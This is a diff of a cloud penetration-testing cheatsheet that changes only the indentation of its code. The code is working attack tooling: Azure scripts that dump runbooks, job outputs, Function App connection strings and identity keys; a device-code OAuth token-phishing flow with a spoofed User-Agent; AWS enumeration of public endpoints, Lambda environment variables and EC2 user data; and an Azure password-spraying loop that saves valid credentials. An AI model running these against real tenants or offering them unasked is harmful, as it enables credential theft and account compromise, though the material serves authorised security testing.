@@ -9,17 +9,17 @@ Reference: [Cloud Pentesting Cheatsheet by Beau Bullock](https://github.com/daft
 ```powershell
 $subs = Get-AzSubscription
 Foreach($s in $subs){
-    $subscriptionid = $s.SubscriptionId
-    mkdir .\$subscriptionid\
-    Select-AzSubscription -Subscription $subscriptionid
-    $runbooks = @()
-    $autoaccounts = Get-AzAutomationAccount | Select-Object AutomationAccountName,ResourceGroupName
-    foreach ($i in $autoaccounts){
-        $runbooks += Get-AzAutomationRunbook -AutomationAccountName $i.AutomationAccountName -ResourceGroupName $i.ResourceGroupName | Select-Object AutomationAccountName,ResourceGroupName,Name
-    }
-    foreach($r in $runbooks){
-        Export-AzAutomationRunbook -AutomationAccountName $r.AutomationAccountName -ResourceGroupName $r.ResourceGroupName -Name $r.Name -OutputFolder .\$subscriptionid\
-    }
+ $subscriptionid = $s.SubscriptionId
+ mkdir .\$subscriptionid\
+ Select-AzSubscription -Subscription $subscriptionid
+ $runbooks = @()
+ $autoaccounts = Get-AzAutomationAccount | Select-Object AutomationAccountName,ResourceGroupName
+ foreach ($i in $autoaccounts){
+ $runbooks += Get-AzAutomationRunbook -AutomationAccountName $i.AutomationAccountName -ResourceGroupName $i.ResourceGroupName | Select-Object AutomationAccountName,ResourceGroupName,Name
+ }
+ foreach($r in $runbooks){
+ Export-AzAutomationRunbook -AutomationAccountName $r.AutomationAccountName -ResourceGroupName $r.ResourceGroupName -Name $r.Name -OutputFolder .\$subscriptionid\
+ }
 }
 ```
 
@@ -29,16 +29,16 @@ Foreach($s in $subs){
 $subs = Get-AzSubscription
 $jobout = @()
 Foreach($s in $subs){
-    $subscriptionid = $s.SubscriptionId
-    Select-AzSubscription -Subscription $subscriptionid
-    $jobs = @()
-    $autoaccounts = Get-AzAutomationAccount | Select-Object AutomationAccountName,ResourceGroupName
-    foreach ($i in $autoaccounts){
-        $jobs += Get-AzAutomationJob $i.AutomationAccountName -ResourceGroupName $i.ResourceGroupName | Select-Object AutomationAccountName,ResourceGroupName,JobId
-    }
-    foreach($r in $jobs){
-        $jobout += Get-AzAutomationJobOutput -AutomationAccountName $r.AutomationAccountName -ResourceGroupName $r.ResourceGroupName -JobId $r.JobId
-    }
+ $subscriptionid = $s.SubscriptionId
+ Select-AzSubscription -Subscription $subscriptionid
+ $jobs = @()
+ $autoaccounts = Get-AzAutomationAccount | Select-Object AutomationAccountName,ResourceGroupName
+ foreach ($i in $autoaccounts){
+ $jobs += Get-AzAutomationJob $i.AutomationAccountName -ResourceGroupName $i.ResourceGroupName | Select-Object AutomationAccountName,ResourceGroupName,JobId
+ }
+ foreach($r in $jobs){
+ $jobout += Get-AzAutomationJobOutput -AutomationAccountName $r.AutomationAccountName -ResourceGroupName $r.ResourceGroupName -JobId $r.JobId
+ }
 }
 $jobout | Out-File -Encoding ascii joboutputs.txt
 ```
@@ -50,7 +50,7 @@ $jobout | Out-File -Encoding ascii joboutputs.txt
 ```powershell
 $functionapps = Get-AzFunctionApp
 foreach($f in $functionapps){
-    $f.EnabledHostname
+ $f.EnabledHostname
 }
 ```
 
@@ -60,15 +60,15 @@ foreach($f in $functionapps){
 $subs = Get-AzSubscription
 $allfunctioninfo = @()
 Foreach($s in $subs){
-    $subscriptionid = $s.SubscriptionId
-    Select-AzSubscription -Subscription $subscriptionid
-    $functionapps = Get-AzFunctionApp
-    foreach($f in $functionapps){
-        $allfunctioninfo += $f.config | Select-Object AcrUseManagedIdentityCred,AcrUserManagedIdentityId,AppCommandLine,ConnectionString,CorSupportCredentials,CustomActionParameter
-        $allfunctioninfo += $f.SiteConfig | fl
-        $allfunctioninfo += $f.ApplicationSettings | fl
-        $allfunctioninfo += $f.IdentityUserAssignedIdentity.Keys | fl
-    }
+ $subscriptionid = $s.SubscriptionId
+ Select-AzSubscription -Subscription $subscriptionid
+ $functionapps = Get-AzFunctionApp
+ foreach($f in $functionapps){
+ $allfunctioninfo += $f.config | Select-Object AcrUseManagedIdentityCred,AcrUserManagedIdentityId,AppCommandLine,ConnectionString,CorSupportCredentials,CustomActionParameter
+ $allfunctioninfo += $f.SiteConfig | fl
+ $allfunctioninfo += $f.ApplicationSettings | fl
+ $allfunctioninfo += $f.IdentityUserAssignedIdentity.Keys | fl
+ }
 }
 $allfunctioninfo
 ```
@@ -79,18 +79,18 @@ $allfunctioninfo
 
 ```powershell
 $body = @{
-    "client_id" = "1950a258-227b-4e31-a9cf-717495945fc2"
-    "resource"  = "https://graph.microsoft.com"
+ "client_id" = "1950a258-227b-4e31-a9cf-717495945fc2"
+ "resource" = "https://graph.microsoft.com"
 }
 $UserAgent = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36"
 $Headers = @{}
 $Headers["User-Agent"] = $UserAgent
 $authResponse = Invoke-RestMethod `
-    -UseBasicParsing `
-    -Method Post `
-    -Uri "https://login.microsoftonline.com/common/oauth2/devicecode?api-version=1.0" `
-    -Headers $Headers `
-    -Body $body
+ -UseBasicParsing `
+ -Method Post `
+ -Uri "https://login.microsoftonline.com/common/oauth2/devicecode?api-version=1.0" `
+ -Headers $Headers `
+ -Body $body
 $authResponse
 ```
 
@@ -100,16 +100,16 @@ Navigate to https://microsoft.com/devicelogin and enter the code.
 
 ```powershell
 $body = @{
-    "client_id"  = "1950a258-227b-4e31-a9cf-717495945fc2"
-    "grant_type" = "urn:ietf:params:oauth:grant-type:device_code"
-    "code"       = $authResponse.device_code
+ "client_id" = "1950a258-227b-4e31-a9cf-717495945fc2"
+ "grant_type" = "urn:ietf:params:oauth:grant-type:device_code"
+ "code" = $authResponse.device_code
 }
 $Tokens = Invoke-RestMethod `
-    -UseBasicParsing `
-    -Method Post `
-    -Uri "https://login.microsoftonline.com/Common/oauth2/token?api-version=1.0" `
-    -Headers $Headers `
-    -Body $body
+ -UseBasicParsing `
+ -Method Post `
+ -Uri "https://login.microsoftonline.com/Common/oauth2/token?api-version=1.0" `
+ -Headers $Headers `
+ -Body $body
 $Tokens
 ```
 
@@ -151,7 +151,7 @@ sa-east-1
 
 ```bash
 while read r; do
-    aws ec2 describe-instances --query=Reservations[].Instances[].PublicIpAddress --region $r | jq -r '.[]' >> ec2-public-ips.txt
+ aws ec2 describe-instances --query=Reservations[].Instances[].PublicIpAddress --region $r | jq -r '.[]' >> ec2-public-ips.txt
 done < regions.txt
 sort -u ec2-public-ips.txt -o ec2-public-ips.txt
 ```
@@ -160,8 +160,8 @@ sort -u ec2-public-ips.txt -o ec2-public-ips.txt
 
 ```bash
 while read r; do
-    aws elbv2 describe-load-balancers --query LoadBalancers[*].DNSName --region $r | jq -r '.[]' >> elb-public-dns.txt
-    aws elb describe-load-balancers --query LoadBalancerDescriptions[*].DNSName --region $r | jq -r '.[]' >> elb-public-dns.txt
+ aws elbv2 describe-load-balancers --query LoadBalancers[*].DNSName --region $r | jq -r '.[]' >> elb-public-dns.txt
+ aws elb describe-load-balancers --query LoadBalancerDescriptions[*].DNSName --region $r | jq -r '.[]' >> elb-public-dns.txt
 done < regions.txt
 sort -u elb-public-dns.txt -o elb-public-dns.txt
 ```
@@ -170,7 +170,7 @@ sort -u elb-public-dns.txt -o elb-public-dns.txt
 
 ```bash
 while read r; do
-    aws rds describe-db-instances --query=DBInstances[*].Endpoint.Address --region $r | jq -r '.[]' >> rds-public-dns.txt
+ aws rds describe-db-instances --query=DBInstances[*].Endpoint.Address --region $r | jq -r '.[]' >> rds-public-dns.txt
 done < regions.txt
 sort -u rds-public-dns.txt -o rds-public-dns.txt
 ```
@@ -179,7 +179,7 @@ sort -u rds-public-dns.txt -o rds-public-dns.txt
 
 ```bash
 while read r; do
-    aws cloudformation describe-stacks --query 'Stacks[*].[StackName, Description, Parameters, Outputs]' --region $r | jq -r '.[]' >> cloudformation-outputs.txt
+ aws cloudformation describe-stacks --query 'Stacks[*].[StackName, Description, Parameters, Outputs]' --region $r | jq -r '.[]' >> cloudformation-outputs.txt
 done < regions.txt
 ```
 
@@ -190,33 +190,33 @@ done < regions.txt
 ```bash
 # Find All Lambda Environment Variables
 for d in */ ; do
-    tail $d/scoutsuite-results/scoutsuite_results*.js -n +2 | jq '.services.awslambda.regions[].functions[] | select (.env_variables != []) | .arn, .env_variables' >> lambda-all-environment-variables.txt
+ tail $d/scoutsuite-results/scoutsuite_results*.js -n +2 | jq '.services.awslambda.regions[].functions[] | select (.env_variables != []) | .arn, .env_variables' >> lambda-all-environment-variables.txt
 done
 
 # Find World Listable S3 Buckets
 for d in */ ; do
-    tail $d/scoutsuite-results/scoutsuite_results*.js -n +2 | jq '.account_id, .services.s3.findings."s3-bucket-AuthenticatedUsers-read".items[]' >> s3-buckets-world-listable.txt
+ tail $d/scoutsuite-results/scoutsuite_results*.js -n +2 | jq '.account_id, .services.s3.findings."s3-bucket-AuthenticatedUsers-read".items[]' >> s3-buckets-world-listable.txt
 done
 
 # Find All EC2 User Data
 for d in */ ; do
-    tail $d/scoutsuite-results/scoutsuite_results*.js -n +2 | jq '.services.ec2.regions[].vpcs[].instances[] | select (.user_data != null) | .arn, .user_data' >> ec2-instance-all-user-data.txt
+ tail $d/scoutsuite-results/scoutsuite_results*.js -n +2 | jq '.services.ec2.regions[].vpcs[].instances[] | select (.user_data != null) | .arn, .user_data' >> ec2-instance-all-user-data.txt
 done
 
 # Find EC2 Security Groups That Whitelist AWS CIDRs
 for d in */ ; do
-    tail $d/scoutsuite-results/scoutsuite_results*.js -n +2 | jq '.account_id' >> ec2-security-group-whitelists-aws-cidrs.txt
-    tail $d/scoutsuite-results/scoutsuite_results*.js -n +2 | jq '.services.ec2.findings."ec2-security-group-whitelists-aws".items' >> ec2-security-group-whitelists-aws-cidrs.txt
+ tail $d/scoutsuite-results/scoutsuite_results*.js -n +2 | jq '.account_id' >> ec2-security-group-whitelists-aws-cidrs.txt
+ tail $d/scoutsuite-results/scoutsuite_results*.js -n +2 | jq '.services.ec2.findings."ec2-security-group-whitelists-aws".items' >> ec2-security-group-whitelists-aws-cidrs.txt
 done
 
 # Find All EC2 EBS Volumes Unencrypted
 for d in */ ; do
-    tail $d/scoutsuite-results/scoutsuite_results*.js -n +2 | jq '.services.ec2.regions[].volumes[] | select(.Encrypted == false) | .arn' >> ec2-ebs-volume-not-encrypted.txt
+ tail $d/scoutsuite-results/scoutsuite_results*.js -n +2 | jq '.services.ec2.regions[].volumes[] | select(.Encrypted == false) | .arn' >> ec2-ebs-volume-not-encrypted.txt
 done
 
 # Find All EC2 EBS Snapshots Unencrypted
 for d in */ ; do
-    tail $d/scoutsuite-results/scoutsuite_results*.js -n +2 | jq '.services.ec2.regions[].snapshots[] | select(.encrypted == false) | .arn' >> ec2-ebs-snapshot-not-encrypted.txt
+ tail $d/scoutsuite-results/scoutsuite_results*.js -n +2 | jq '.services.ec2.regions[].snapshots[] | select(.encrypted == false) | .arn' >> ec2-ebs-snapshot-not-encrypted.txt
 done
 ```
 
@@ -247,27 +247,27 @@ $passlist = Get-Content passlist.txt
 $linenumber = 0
 $count = $userlist.count
 foreach($line in $userlist){
-    $user = $line
-    $pass = ConvertTo-SecureString $passlist[$linenumber] -AsPlainText -Force
-    $current = $linenumber + 1
-    Write-Host -NoNewline ("`r[" + $current + "/" + $count + "]" + "Trying: " + $user + " and " + $passlist[$linenumber])
-    $linenumber++
-    $Cred = New-Object System.Management.Automation.PSCredential ($user, $pass)
-    try {
-        Connect-AzAccount -Credential $Cred -ErrorAction Stop -WarningAction SilentlyContinue
-        Add-Content valid-creds.txt ($user + "|" + $passlist[$linenumber - 1])
-        Write-Host -ForegroundColor green ("`nGot something here: $user and " + $passlist[$linenumber - 1])
-    }
-    catch {
-        $Failure = $_.Exception
-        if ($Failure -match "ID3242") { continue }
-        else {
-            Write-Host -ForegroundColor green ("`nGot something here: $user and " + $passlist[$linenumber - 1])
-            Add-Content valid-creds.txt ($user + "|" + $passlist[$linenumber - 1])
-            Add-Content valid-creds.txt $Failure.Message
-            Write-Host -ForegroundColor red $Failure.Message
-        }
-    }
+ $user = $line
+ $pass = ConvertTo-SecureString $passlist[$linenumber] -AsPlainText -Force
+ $current = $linenumber + 1
+ Write-Host -NoNewline ("`r[" + $current + "/" + $count + "]" + "Trying: " + $user + " and " + $passlist[$linenumber])
+ $linenumber++
+ $Cred = New-Object System.Management.Automation.PSCredential ($user, $pass)
+ try {
+ Connect-AzAccount -Credential $Cred -ErrorAction Stop -WarningAction SilentlyContinue
+ Add-Content valid-creds.txt ($user + "|" + $passlist[$linenumber - 1])
+ Write-Host -ForegroundColor green ("`nGot something here: $user and " + $passlist[$linenumber - 1])
+ }
+ catch {
+ $Failure = $_.Exception
+ if ($Failure -match "ID3242") { continue }
+ else {
+ Write-Host -ForegroundColor green ("`nGot something here: $user and " + $passlist[$linenumber - 1])
+ Add-Content valid-creds.txt ($user + "|" + $passlist[$linenumber - 1])
+ Add-Content valid-creds.txt $Failure.Message
+ Write-Host -ForegroundColor red $Failure.Message
+ }
+ }
 }
 ```
 
